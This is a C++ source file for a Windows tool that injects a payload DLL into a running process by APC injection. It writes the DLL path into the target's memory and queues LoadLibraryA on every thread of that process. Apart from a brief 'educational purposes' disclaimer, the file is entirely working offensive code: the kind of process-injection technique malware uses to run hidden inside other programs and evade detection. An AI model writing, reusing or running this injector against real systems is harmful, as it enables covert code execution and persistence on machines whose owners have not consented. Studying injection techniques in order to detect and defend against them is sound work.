/*
 * Disclaimer:
 * This code was created for educational purposes only.
 * The author does not take responsibility for any misuse 
 * or unintended consequences arising from its application.
 * Users are encouraged to exercise caution and adhere to 
 * all relevant laws and regulations when utilizing this code.
 */

#include <Windows.h>
#include <stdio.h>
#include <cstdlib>
#include <vector>
#include <tlhelp32.h>


INT main(INT argc, PCHAR argv[])
{

	printf("\n[+] Enter PID of process to inject via APC Injection and path to payload DLL.\n");
	printf("Example: DLLInject.exe 123 C :\\Users\\Public\\Payload.dll\n");

	if (argc != 3)
	{
		printf("\n[x] Incorrect number of arguments.\n");
		return 1;
	}

	INT pid = atoi(argv[1]);
	PCHAR PayloadPath = argv[2];
	printf("Path: %s\n", PayloadPath);

	HANDLE hTarget = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);

	PVOID RemoteBuff = VirtualAllocEx(hTarget, nullptr, USN_PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	SIZE_T NumberBytesW = 0;

	BOOL MemPaylod = WriteProcessMemory(hTarget, RemoteBuff, PayloadPath, strlen(PayloadPath), &NumberBytesW);

	std::vector<ULONG> Threads;

	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	THREADENTRY32 threadent32 = {sizeof(threadent32)};

	if (Thread32First(Snap, &threadent32))
	{
		do
		{
			if (threadent32.th32OwnerProcessID == pid)
				Threads.push_back(threadent32.th32ThreadID);

		} while (Thread32Next(Snap, &threadent32));
		CloseHandle(Snap);
		
	}

	HMODULE hKer32 = GetModuleHandleW(L"kernel32.dll");

	FARPROC pLoadLibAd = GetProcAddress(hKer32, "LoadLibraryA");

	for (const ULONG ThId : Threads)
	{
		HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, ThId);
		QueueUserAPC((PAPCFUNC)pLoadLibAd, hThread, (ULONG_PTR)RemoteBuff);
		CloseHandle(hThread);
	}

	CloseHandle(hTarget);

	return 0;
}
